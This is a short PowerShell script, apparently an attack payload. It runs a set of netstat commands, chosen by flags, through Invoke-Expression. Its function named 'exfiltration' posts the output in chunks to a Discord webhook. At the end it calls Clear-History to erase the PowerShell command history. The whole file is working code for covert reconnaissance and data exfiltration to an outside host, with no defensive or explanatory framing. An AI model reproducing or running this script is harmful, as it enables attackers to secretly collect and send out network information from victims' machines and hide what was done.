
# Discord send function
function exfiltration () {
	param(
		[Parameter (Mandatory = $true, Position=0)] [String]$command,
		[Parameter (Mandatory = $true, Position=1)] [String]$text
	)
	# Loop for Discord
	$ConstantLimitForRestMethod = 1999
	$TMP_Body = @{
		'username' = $command
		'content' = ""
	}
	for($i = 0; $i -lt $text.Length; $i+=$ConstantLimitForRestMethod){
		try {
			$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $ConstantLimitForRestMethod)
			}
		} catch [ArgumentOutOfRangeException] {
			if($text.Length-$i -gt 0){
				$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $text.Length-$i)
				}
			} else {
				break
			}
		}
		Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($TMP_Body | ConvertTo-Json)
	}
}

# send command format
function send_command(){
	param(
		[Parameter (Mandatory = $true, Position=0)] [String]$cmd
	)
	$out = Invoke-Expression $cmd
	(exfiltration $cmd [string]$out)
}

# Settings
if ( $d -eq "1") {
	$cmd = "netstat"
	(send_command $cmd)
}
if ( $r -eq "1") {
	$cmd = "netstat -r"
	(send_command $cmd)
}
if ( $lc -eq "1") {
	$cmd = "netstat -af"
	(send_command $cmd)
}
if ( $ln -eq "1") {
	$cmd = "netstat -an"
	(send_command $cmd)
}
if ( $ac -eq "1") {
	$cmd = "netstat -qf"
	(send_command $cmd)
}
if ( $an -eq "1") {
	$cmd = "netstat -qn"
	(send_command $cmd)
}
if ( $o -eq "1") {
	$cmd = "netstat -t"
	(send_command $cmd)
}
if ( $p -ne "" ) {
	# format $proto="TCP"
	$cmd = "netstat -ps " + $p
	(send_command $cmd)
}

# Clear the PowerShell command history
Clear-History